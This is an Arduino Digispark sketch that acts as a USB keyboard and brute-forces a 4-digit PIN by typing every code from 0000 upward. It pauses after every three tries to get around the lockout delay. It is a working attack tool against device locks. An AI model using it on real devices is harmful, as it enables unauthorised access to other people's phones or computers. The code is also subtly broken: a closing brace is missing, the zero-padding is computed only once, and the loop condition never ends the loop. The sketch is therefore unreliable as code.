// 4-digits PIN bruteforce with Keystroke Injection
// By BlueArduino20

#include "DigiKeyboard.h"
int DIGIT_0 = 0;
int DIGITN = 0;
int COUNT = 0;
int SECURITY_DELAY = 30; // (In seconds)
int DELAY_BW_TRIES = 100; // (In miliseconds)
int MAX_TRIES = 3;
String DIGITNs = "0";

void setup() {
}

void loop() {
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(0);
  String DIGITNs = String(DIGITN);
  while (COUNT <= 5) {
    if (DIGITNs.length() == 1) {
      DigiKeyboard.print(DIGIT_0);
      DigiKeyboard.print(DIGIT_0);
      DigiKeyboard.print(DIGIT_0);
    }
    if (DIGITNs.length() == 2) {
      DigiKeyboard.print(DIGIT_0);
      DigiKeyboard.print(DIGIT_0);
    }
    if (DIGITNs.length() == 3) {
      DigiKeyboard.print(DIGIT_0);
    }
    DigiKeyboard.println(DIGITN);
    DIGITN++;
    COUNT++;
    if (COUNT == MAX_TRIES) {
      COUNT = 0;
      delay(SECURITY_DELAY * 1000);
    }
    if (DIGITN == 9999) {
		while (true) {
			delay(100);
		}
    delay(DELAY_BW_TRIES);
  }
}
